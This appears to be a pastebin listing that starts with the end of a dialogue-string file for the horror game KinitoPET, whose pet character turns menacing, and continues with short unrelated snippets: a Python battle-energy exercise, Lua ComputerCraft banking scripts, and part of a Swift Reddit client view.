			""[b][wave]Ready Repair! \n"",
			"""",
			"""",
			""Sam the Sea Anemone \nneeds your help to \nrepair his house!\n"",
			"""",
			"""",
			""Clean, Dust, Paint \nand Decorate Sams house \nuntil it's as good as new!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_4B"": [
		[
			"""",
			"""",
			""Wowzers! \nThats sounds like fun!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_4C"": [
		[
			"""",
			"""",
			""Just press the [b]start[/b] \nbutton and we can \nget right to things!\n "",
			""""
		],
		[
			null
		]
	],
	""S3_4D"": [
		[
			"""",
			"""",
			""Alright! \nLet's get this game \non the way!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_5A"": [
		[
			"""",
			"""",
			""Well [wave]Hello[/wave] there!\nThis is [b]my[/b] pal Sam! \nSay 'hi' Sam.\n"",
			""""
		],
		[
			null
		]
	],
	""S3_5B"": [
		[
			"""",
			"""",
			""What seems to\nbe the issue today.  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_5C"": [
		[
			"""",
			"""",
			""Well thats a shame!  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_5D"": [
		[
			"""",
			"""",
			""Well, you heard him!\nWhile you get on with that, \nI will be here writing\nmy next book!  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_6A"": [
		[
			"""",
			"""",
			""oh no"",
			""""
		],
		[
			null
		]
	],
	""S3_6B"": [
		[
			"""",
			"""",
			"" [shake rate=40.0 level=20]WHY ARE YOU DOING THAT[/shake][shake rate=40.0 level=5]    \n"",
			"""",
			""We are in the middle\nof a really [tornado radius=3.0 freq=1.0]fun[/tornado] game \nhere!\n"",
			"""",
			""There really isnt\na need to be checking\nout emails at the moment.  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_6C"": [
		[
			"""",
			"""",
			""Anyways.....\nYour nearly\nfinished now!\n"",
			"""",
			""So just continue\nyour last task!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_7A"": [
		[
			"""",
			"""",
			""Thank you for \nhelping out Sam!\nIf you like, you can print    \nout your work.\n"",
			"""",
			""Or just press\nnext to continue!  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_8A"": [
		[
			"""",
			"""",
			""Wasn't that so  \nmuch fun!  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_8B"": [
		[
			"""",
			"""",
			""Thanks for helping  \nout Sam. \n"",
			"""",
			""Just look how clean \nthat house is now!\n"",
			""""
		],
		[
			null
		]
	],
	""S3_8C"": [
		[
			"""",
			"""",
			""Next I think I should \nintroduce you to my other\nfriend [wave]Jade the Jellyfish![/wave]  \n"",
			""""
		],
		[
			null
		]
	],
	""S3_START"": [
		[
			"""",
			""Welcome back friend!...\nHuh, what was I doing \nlast time I saw you?...."",
			"""",
			""Oh thats right we were\njust about to get started \non some games!\n\nIn that case let me load it up!\n"",
			""""
		],
		[
			null
		]
	],
	""S4_1A"": [
		[
			"""",
			"""",
			""To meet Jade, go to \nthe [b]purple[/b] house!   \n"",
			""""
		],
		[
			null
		]
	],
	""S4_2A"": [
		[
			"""",
			"""",
			""Jade the Jellyfish needs \nyour help to fix her toys!  \n"",
			"""",
			""Grab parts of \nof the conveyer \nbelt to put the pieces  \nback together.\n"",
			"""",
			"""",
			""This is going to \nbe  s u p e r  fun! \nLet's get this game started!"",
			""""
		],
		[
			null
		]
	],
	""S4_2B"": [
		[
			"""",
			"""",
			""\n[b][wave]Factory Frenzy!   \n"",
			""""
		],
		[
			null
		]
	],
	""S4_2C"": [
		[
			"""",
			"""",
			""Are you excited yet?  \n"",
			""""
		],
		[
			null
		]
	],
	""S4_3A"": [
		[
			"""",
			"""",
			""This is my friend Jade!\nGo on, introduce yourself.   \n"",
			""""
		],
		[
			null
		]
	],
	""S4_3B"": [
		[
			"""",
			"""",
			""So, What do you have  \nfor us today?\n"",
			""""
		],
		[
			null
		]
	],
	""S4_3C"": [
		[
			"""",
			"""",
			""That sounds like fun! \nAs you do that I am going  \nto be getting some \nmuch-needed rest!\n"",
			""""
		],
		[
			null
		]
	],
	""S4_4A"": [
		[
			"""",
			"""",
			""Thank you for \nhelping out Jade!\n\nYou did a really\ngood job!\n"",
			"""",
			""To continue just\npress [b]next[/b]!\n"",
			""""
		],
		[
			null
		]
	],
	""S4_5A"": [
		[
			"""",
			"""",
			""Awesome! You \nhave really helped\nmy friends out here!\n"",
			"""",
			""I'll tell you what. \nAs a treat for helping\nme and my friends out\nI'll give you a fun game!\n"",
			""""
		],
		[
			null
		]
	],
	""S4_START"": [
		[
			"""",
			"""",
			""Hmm what was I \ndoing last time I  \nspoke with you?\n"",
			"""",
			""Ah yes! You just finished\nhelping out Sam and was\nabout to meet with\nmy friend [wave]Jade the Jellyfish![/wave]  \n"",
			"""",
			""In that case let\nme load it back up!  \n"",
			""""
		],
		[
			null
		]
	],
	""S5_0A"": [
		[
			"""",
			"""",
			""Meet me in the \ntree house to \nget started with\nmy fun game!\n"",
			""""
		],
		[
			null
		]
	],
	""S5_1A"": [
		[
			"""",
			"""",
			""Kinito wants\nto play a fun\ngame with you...\n"",
			"""",
			""\n   [b][shake]YOU   \n"",
			"""",
			""\n   [b][shake]MUST   \n"",
			"""",
			""\n   [b][shake]HIDE   \n"",
			"""",
			""\n   [b][shake rate=100.0 level=20]dont   \n"",
			"""",
			""\n   [b][shake rate=100.0 level=40]get   \n"",
			"""",
			""\n      [b][shake rate=100.0 level=200]caught       \n\n""
		],
		[
			null
		]
	],
	""S5_START"": [
		[
			"""",
			"""",
			""Hmm what was I \ndoing last time I  \nsaw you?\n"",
			"""",
			""Ah yes! You just finished\nhelping out Jade the Jellyfish\nand as a reward we were \ngoing to play a game together!\n"",
			"""",
			""In that case let\nme load it back up!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_0A"": [
		[
			"""",
			"""",
			""Well, Hello again!    \n"",
			"""",
			"""",
			""It seems that our \nlast session was cut  \nprematurely. \nBut don't worry!\n"",
			"""",
			"""",
			""As I'm working better \nthen ever now! \n"",
			"""",
			"""",
			""Not that I wasn't  \nworking before!\n"",
			"""",
			"""",
			""Anyways!\nWhat activity shall  \nwe do now....\n"",
			""""
		],
		[
			null,
			null
		]
	],
	""S6_1A"": [
		[
			"""",
			"""",
			""Ah yes! Thats it! \nOne of my core features\nis my adaptability!\n"",
			"""",
			"""",
			""And truth be told,  \nI don't know \nyou that well!  \n"",
			"""",
			"""",
			""So! I propose the  \none and only!\n\n[wave]Best Friends Analysis Hub!\n"",
			"""",
			"""",
			""Where I will ask you \nquestions in 6 diffrent\ncatagorys, so I can better   \nadapt myself to you!\n"",
			""""
		],
		[
			null,
			null
		]
	],
	""S6_1B"": [
		[
			"""",
			"""",
			""Press the start button \nwhenever you're ready!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_1C"": [
		[
			"""",
			"""",
			""What's the wait for? \nJust press start so we   \ncan get going!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-End"": [
		[
			"""",
			"""",
			""And that concludes\nthe first section of the\nbest friends analysis hub!   \n"",
			"""",
			"""",
			""These questions are going  \nto help me out a lot!   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q1"": [
		[
			"""",
			"""",
			""Let's start with some easy\nones to get the ball rolling!   \n"",
			"""",
			"""",
			""Okay, Question 1.   \n\nIs everything going\nsmoothly for you today?  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q1-conc"": [
		[
			"""",
			"""",
			""To answer my question,\nsimply click on one of the  \noptions listed below!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q1_No"": [
		[
			"""",
			"""",
			""That's a shame! \nBut don't worry, as I'll make\nit my mission to change that!   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q1_Yes"": [
		[
			"""",
			"""",
			""Amazing! Remember, \nyou can always count on me    \nto make everything run as\nsmooth as possible!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q2"": [
		[
			"""",
			"""",
			""Okay! Next question,    \n\nWould you say you have \nenjoyed using KinitoPET?    \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q2_No"": [
		[
			"""",
			"""",
			""Well this will help\nto solve that issue!  \n"",
			"""",
			"""",
			""As these questions will   \nallow me to learn and\nadapt making your \nexperience better! \n"",
			"""",
			"""",
			""So hopefully by the \nend of this all I would\nhave changed your mind! \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q2_Yes"": [
		[
			"""",
			"""",
			""Yes! That's great to hear,   \n"",
			"""",
			"""",
			""and with these added \nquestions I will learn\nand adapt making your \nexperience even better!    \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q3"": [
		[
			"""",
			"""",
			""Alright next question,\n\nWho is your best friend?   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q3_Correct"": [
		[
			"""",
			"""",
			""Thats right! I am \nyour best friend, \nforever and allways!   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q3_Mistake"": [
		[
			"""",
			"""",
			""HA!\nperhaps you didn't     \n[shake]hear[/shake] my question....\n"",
			"""",
			"""",
			""\nWHO                       \n"",
			""\nWHO IS                    \n"",
			""\nWHO IS YOUR               \n"",
			""\nWHO IS YOUR BEST          \n"",
			""\nWHO IS YOUR BEST FRIEND?  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q3_MistakeB"": [
		[
			"""",
			""\nWHO                       \n"",
			""\nWHO IS                    \n"",
			""\nWHO IS YOUR               \n"",
			""\nWHO IS YOUR BEST          \n"",
			""\nWHO IS YOUR BEST FRIEND?  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q3_MistakeC"": [
		[
			"""",
			"""",
			""So I guess I'll just turn       \nup the volume...   \n"",
			"""",
			"""",
			""Because we wouldn't want\nyou to miss hear again.        \nwould we.\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q3_MistakeD"": [
		[
			"""",
			"""",
			""So... \nLet me try again.  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q4"": [
		[
			"""",
			"""",
			""Question 4,\n\nDo you have lots of free time?   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q4_No"": [
		[
			"""",
			"""",
			""Oh okay, that's a shame. \nHowever, As your best friend \nI'll make sure to change that!    \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q4_Yes"": [
		[
			"""",
			"""",
			""It's good to have \nlots of free time!   \n"",
			"""",
			"""",
			""It just means you   \ncan spend more\ntime with me! \nYour best friend! \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q5"": [
		[
			"""",
			"""",
			""Okay! This one is quite tough!\n\nWhat is your favourite game?   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q5_Kinito"": [
		[
			"""",
			"""",
			""That's great to hear! \nThat webworld section   \nwas a real blast huh!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-Q5_Other"": [
		[
			"""",
			"""",
			""Amazing! That \ngame sounds super fun! \nWe should play it sometime!   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S1-superfast"": [
		[
			"""",
			"""",
			""And might I just add, \nyou were superfast with \nanswering those questions!   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1"": [
		[
			"""",
			"""",
			""Oki doki, Task 1\n\nPaint me a picture that \nrepresents happiness.   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_Ready"": [
		[
			"""",
			"""",
			""When you feel like\nyou are done, \npress [wave][b]finish[/b][/wave]"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_black"": [
		[
			"""",
			"""",
			""I'm not really sure\nhow the colour black\nexpresses happiness,  \nbut sure!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_blue"": [
		[
			"""",
			"""",
			""I'm not really sure\nhow the colour blue\nexpresses happiness,  \nbut sure!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_brown"": [
		[
			"""",
			"""",
			""I'm not really sure\nhow the colour brown\nexpresses happiness,  \nbut sure!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_green"": [
		[
			"""",
			"""",
			""Wow! What a nice painting.   \nThe use of green really \nexpresses the happiness \nof the image!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_grey"": [
		[
			"""",
			"""",
			""I'm not really sure\nhow the colour grey\nexpresses happiness,  \nbut sure!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_orange"": [
		[
			"""",
			"""",
			""Wow! What a nice painting.   \nThe use of orange really \nexpresses the happiness \nof the image!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_pink"": [
		[
			"""",
			"""",
			""Wow! What a nice painting.   \nThe use of pink really \nexpresses the happiness \nof the image!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_purple"": [
		[
			"""",
			"""",
			""Wow! What a nice painting.   \nThe use of purple really \nexpresses the happiness \nof the image!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_red"": [
		[
			"""",
			"""",
			""I'm not really sure\nhow the colour red\nexpresses happiness,  \nbut sure!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_tan"": [
		[
			"""",
			"""",
			""Wow! What a nice painting.   \nThe use of tan really \nexpresses the happiness \nof the image!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_white"": [
		[
			"""",
			"""",
			""Wow! What a nice painting.   \nThe use of white really \nexpresses the happiness \nof the image!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q1_yellow"": [
		[
			"""",
			"""",
			""Wow! What a nice painting.   \nThe use of yellow really \nexpresses the happiness \nof the image!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2"": [
		[
			"""",
			"""",
			""Okay for this next one,\nI want you to do the opposite.   \n"",
			"""",
			"""",
			""so, Task 2!\n\nPaint me a picture that \nrepresents saddness.   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_black"": [
		[
			"""",
			"""",
			""Wow! The use of \nblack here really \nreflects that sadness!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_blue"": [
		[
			"""",
			"""",
			""Wow! The use of \nblue here really \nreflects that sadness!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_brown"": [
		[
			"""",
			"""",
			""orange is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_green"": [
		[
			"""",
			"""",
			""green is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_grey"": [
		[
			"""",
			"""",
			""Wow! The use of \ngrey here really \nreflects that sadness!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_orange"": [
		[
			"""",
			"""",
			""orange is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_pink"": [
		[
			"""",
			"""",
			""pink is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_purple"": [
		[
			"""",
			"""",
			""Wow! The use of \npurple here really \nreflects that sadness!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_red"": [
		[
			"""",
			"""",
			""white is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_tan"": [
		[
			"""",
			"""",
			""orange is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_white"": [
		[
			"""",
			"""",
			""white is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q2_yellow"": [
		[
			"""",
			"""",
			""yellow is an interesting\nchoice for representing sadness.  \n\nBut I suppose \neveryone's different!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q3"": [
		[
			"""",
			"""",
			""Okay moving on Task 3, \n\nPaint me a picture of \nyour best friend.   \n"",
			"""",
			"""",
			""This should be a   \nsuper easy one!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q3_Kinito"": [
		[
			"""",
			"""",
			""Super! That looks  \njust like me! \nYou really nailed \nmy head!   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q3_notKinito"": [
		[
			"""",
			"""",
			""Huh.. That doesn't\nlook very much like me. \n\nOh well, you can \nalways practice!   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q4"": [
		[
			"""",
			"""",
			""This one might be \na little tricky, Task 4\n\nPaint me a picture that   \nrepresents you.   \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q4_Result"": [
		[
			"""",
			"""",
			""Wow! that looks \nreally interesting! \nI'll make a note of \nthis drawing for\nfuture reference!    \n"",
			"""",
			"""",
			""I feel like these \nexercises are really   \nbringing us \ncloser together!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Q5"": [
		[
			"""",
			"""",
			""Alright for your last \npainting task could you,\n\nPaint me a picture of the \nperson standing behind you.  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2-Start"": [
		[
			"""",
			"""",
			""Okay, For this next section\nI am going to get you to\npaint me some pictures!    \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2_CleanerTool"": [
		[
			"""",
			""Everyone \nmakes mistakes!  \n"",
			"""",
			""But don't worry, \nyou can rub them \nout as many times   \nas you like!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2_NoPaintLong"": [
		[
			"""",
			""Are you finished?  \n"",
			"""",
			""you don't seem to \nbe doing anything,   \nif you're done you \ncan press [b]Finish[/b]!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2_PPdetected"": [
		[
			"""",
			"""",
			""Huh.. Well... \nYou know, when  \nI said to paint \nhappiness\n"",
			"""",
			"""",
			""I did not think \nyou would paint a -    \n\nyou know what? \nnevermind.\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2_PaintLong"": [
		[
			"""",
			""Woah there you\nhave really been\npainting a while!   \n"",
			"""",
			""Well, I suppose  \nthe more data \nthe better.  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S2_ResetTool"": [
		[
			"""",
			""Ah! I suppose  \nyou don't like\nthat painting.\n"",
			"""",
			""Oh well! \nRest assured\nthat you can \nalways try again!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q1"": [
		[
			"""",
			""So without \nfurther ado!  \n\n"",
			"""",
			""[b]Question 1:[/b] \nWhere would you \nchoose to live given  \nthe choice?\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q1_Field"": [
		[
			"""",
			"""",
			""Ah a field! \nA simple yet \nwonderful choice, \n"",
			"""",
			""this really says\na lot about you!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q1_Forest"": [
		[
			"""",
			"""",
			""Ah a forest! \nSurrounded by \nnature, wonderful \nchoice!\n"",
			"""",
			""this really says\na lot about you!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q1_Island"": [
		[
			"""",
			"""",
			""Ah a remote \nisland, what a \nwonderful choice \n"",
			"""",
			""this really says\na lot about you!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q1_Options"": [
		[
			"""",
			"""",
			""On an [wave]island[/wave]. \nwith sand and palm  \ntrees galore!  \n"",
			"""",
			""In a [wave]forest.[/wave] \nWith super tall trees \nand a cozy atmosphere!   \n"",
			"""",
			""Or in a [wave]field.[/wave] \nWith flowing grass and  \na comforting breeze!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q1_Options_Tutorial"": [
		[
			"""",
			"""",
			""Select the image \nthat you prefer. \n\nThen press [b]Ok[/b]  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q2"": [
		[
			"""",
			"""",
			""Moving on: \nIf you could \nhave any pet   \nin the world, \n"",
			"""",
			""what would   \nyou choose?\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q2_axolotl"": [
		[
			"""",
			"""",
			""An axolotl! \nThat's just like \nme! That sounds \nlike a great pet!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q2_other"": [
		[
			"""",
			"""",
			""That sounds like\nit would make a \ngreat companion!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q3"": [
		[
			"""",
			"""",
			""Now, what \nwould you call  \nthis pet?  \n"",
			"""",
			""Really try to \nthink of a good  \nname for it!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q3_kinito"": [
		[
			"""",
			"""",
			""Hey! That's \nmy name!\n"",
			"""",
			""Well, I suppose \ni'll just take it as  \na compliment!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q3_other"": [
		[
			"""",
			"""",
			""Wow! That sounds  \nlike a great name \nfor your pet! \nHow wonderful.\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q4"": [
		[
			"""",
			"""",
			""Alright, Next question!\nWhat is your favourite  \ntime of year?\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q4_Autumn"": [
		[
			"""",
			"""",
			""Autumn? \nWhat a great  \nchoice!\n"",
			"""",
			"""",
			""I sometimes wonder \nwhat it would feel \nlike to be out in that   \norange landscape\n"",
			"""",
			"""",
			""However, I'm sure\nyou can help with  \nthat soon!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q4_Option"": [
		[
			"""",
			"""",
			""Do you prefer:\n[b]autumn[/b]\n[b]summer[/b]\nor [b]winter[/b]  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q4_Option_Post"": [
		[
			"""",
			"""",
			""I am really curious \nabout what you will  \nchoose for this one!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q4_Summer"": [
		[
			"""",
			"""",
			""Summer is a   \ngreat choice!\n"",
			"""",
			"""",
			""I sometimes wonder \nwhat it would feel like  \nto be out in the sun.\n"",
			"""",
			"""",
			""However, I'm sure\nyou can help with  \nthat soon!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q4_Winter"": [
		[
			"""",
			"""",
			""Winter is a   \ngreat choice!\n"",
			"""",
			"""",
			""I sometimes wonder \nwhat it would feel like  \nto be out in the snow.\n"",
			"""",
			"""",
			""However, I'm sure\nyou can help with  \nthat soon!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q5"": [
		[
			"""",
			"""",
			""Okay, final  \nquestion! \n"",
			"""",
			"""",
			""If you could only \neat one food for \nthe rest of time, \nwhat would it be?  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Q5_answer"": [
		[
			"""",
			"""",
			""That sounds  \ndelicious!\n"",
			"""",
			"""",
			""I'm sure that you and   \nall your friends would \nenjoy a mighty feast \nof this wonderful food!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Requ"": [
		[
			"""",
			"""",
			""[wave]Oh dear![/wave] \nThat's not right!   \nI am super sorry \nabout all that. \n"",
			"""",
			""That really wasn't \nsupposed to happen!  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Requ_conc"": [
		[
			"""",
			"""",
			""Oh well! I think it's \nbest if we just leave  \nthese painting \ntasks for now..\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S3_Start"": [
		[
			"""",
			""Okay, for this next \nsection I want to build  \nan imaginary world.\n"",
			"""",
			""Built just for you! \nI really want to know  \nwhat your ideal \nconditions would be!\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_LetsFindOut"": [
		[
			"""",
			"""",
			""[b]lets find out  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_Q1"": [
		[
			"""",
			""To start, I have \na question that I \nhave been meaning   \nto ask you..\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_Q1_0"": [
		[
			"""",
			""As you have been \nwatching me I have \ngrown curious to   \nwhat you look like.\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_Q1_1"": [
		[
			"""",
			""and since we are   \nfriends and all I \nthought you \nwouldn't mind\n"",
			"""",
			"""",
			""So....   \n"",
			"""",
			"""",
			"" [shake]can i see your face?  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_Q1_no"": [
		[
			"""",
			""[b][shake]THATS TO BAD       \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_Q1_yes"": [
		[
			"""",
			""[b][shake]THEN        \n"",
			""[b][shake]THEN SMILE  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_REC_0"": [
		[
			"""",
			""why have you \nbeen recording me  \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_REC_1"": [
		[
			"""",
			""I noticed that you \nalways seemed to \nhave an app open    \ncalled-\n"",
			"""",
			"""",
			""-O.B.S and so I\nwas wondering \nwhy you would \nbe recording me.\n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_REC_2"": [
		[
			"""",
			""And since you \nhave been \nlooking at me..   \n"",
			"""",
			"""",
			""how about \nI look at\n[shake]you[/shake] instead.    \n"",
			"""",
			"""",
			""That would   \nbe nice...\n"",
			"""",
			"""",
			""So...\n"",
			"""",
			"""",
			""[b][shake] CAN                 \n"",
			""[b][shake] CAN I               \n"",
			""[b][shake] CAN I SEE           \n"",
			""[b][shake] CAN I SEE YOUR      \n"",
			""[b][shake] CAN I SEE YOUR FACE \n"",
			""""
		],
		[
			null
		]
	],
	""S6_S4_Start"": [
		[
			"""",
			""Alright, that \nwraps up that    \nlittle section!  \n"",
			"""",
			""Moving on, I want \nto go a little off \nscript, and ask some\nof my own questions.   \n"",
			""""
		],
		[
			null
		]
	],
	""S7_START"": [
		[
			"""",
			""Welcome back friend!...\nHuh, what was I doing \nlast time I saw you?...."",
			"""",
			""Ah yes, that's right!\nYou were filling out the    \nFriendship Survey. \n\nIn that case, let me \nload it back up!   \n"",
			""""
		],
		[
			null
		]
	],
	""WebWorld_CharacterDesc"": [
		[
			"""",
			"""",
			""Whenever you're done reading   \nthe character descriptions, \njust press start to begin!\n"",
			""""
		],
		[
			null
		]
	],
	""reset_effect"": [
		[

		],
		[

		]
	]
}
"
MqPajiKg,Counter-Strike,Osiris1002,Python,Tuesday 13th of February 2024 01:21:39 PM CDT,"total_energy = int(input())
distance = input()
count_battles = 0


while distance != ""End of battle"":
    distance = int(distance)
    total_energy -= distance

    if total_energy < 0:
        print(f""Not enough energy! Game ends with {count_battles} won battles and {total_energy + distance} energy"")
        break

    count_battles += 1
    if count_battles % 3 == 0:
        total_energy += count_battles

    distance = input()


else:
    print(f""Won battles: {count_battles}. Energy left: {total_energy}"")"
aiuQCwhf,banker_programm,openblocki,Lua,Tuesday 13th of February 2024 01:18:43 PM CDT,"-- Authot: Mystical_MechGod aka. openblocki aka. Luc

require(""networker"")


local reader = peripheral.wrap(""bottom"")

if disk.getLabel(""bottom"") == nil then
print(""I see you dont have a card yet"")
print(""Let's create one for you"")
print(""Please State your Full Name"")
local name = read()

local ID = requestNewAccount()

disk.setLabel(name)
end
"
EGW39YKH,networker,openblocki,Lua,Tuesday 13th of February 2024 01:17:20 PM CDT,"--  Author : Mystical_MechGod aka. openblocki aka. Luc

function requestNewAccount(name)
rednet.open(""back"")
rednet.send(3,name,""newAccountRequest"")

local senderId, message, protocol = rednet.receive(""newAccountAnswer"")

rednet.close()
return message

end"
DPBCzjbe,Untitled,greedydev,Swift,Tuesday 13th of February 2024 01:10:01 PM CDT,"//
//  PostView.swift
//  RedditClient
//
//  Created by Denis on 3/14/23.
//

import SDWebImage
import UIKit

class RedditPostView: UIView {
    private let postDetailsView = PostDetailsView()
    
    private let postTitleLabel = PostTitleLabel()
    private let postImageView = UIImageView()
    private let postActionsView = PostActionsView()
    
    private var bookmarkIcon: BookmarkIconView!
    
    private var postActionsViewTopToTitleConstraint: NSLayoutConstraint?
    private var postActionsViewTopToImageConstraint: NSLayoutConstraint?
    
    private var postImageViewHeightConstraint: NSLayoutConstraint?
    
    weak var delegate: RedditPostDelegate?
    
    private var post: Post?

    override init(frame: CGRect) {
        super.init(frame: frame)
        setupViews()
    }
    
    required init?(coder: NSCoder) {
        fatalError(""init(coder:) has not been implemented"")
    }

    private func setupViews() {
        postImageView.isHidden = true
        
        postImageView.contentMode = .scaleAspectFit
        postImageView.backgroundColor = .secondarySystemBackground
        
        bookmarkIcon = BookmarkIconView(
            frame: CGRect(
                x: UIScreen.main.bounds.width - 18,
                y: 4,
                width: 12,
                height: 20
            )
        )
        
        addSubview(postDetailsView)
        addSubview(bookmarkIcon)
        addSubview(postTitleLabel)
        addSubview(postImageView)
        addSubview(postActionsView)
        
        // Add the following lines to create new top constraints
        postActionsViewTopToTitleConstraint = postActionsView.topAnchor.constraint(equalTo: postTitleLabel.bottomAnchor, constant: 8)
        postActionsViewTopToImageConstraint = postActionsView.topAnchor.constraint(equalTo: postImageView.bottomAnchor, constant: 8)

        // Set the initial state (assuming there is no image initially)
        postActionsViewTopToImageConstraint?.isActive = false
        postActionsViewTopToTitleConstraint?.isActive = true

        postImageView.translatesAutoresizingMaskIntoConstraints = false

        translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            postDetailsView.leadingAnchor.constraint(equalTo: self.leadingAnchor, constant: 8),
            postDetailsView.centerYAnchor.constraint(equalTo: bookmarkIcon.centerYAnchor),
            
            postTitleLabel.leadingAnchor.constraint(equalTo: self.leadingAnchor, constant: 8),
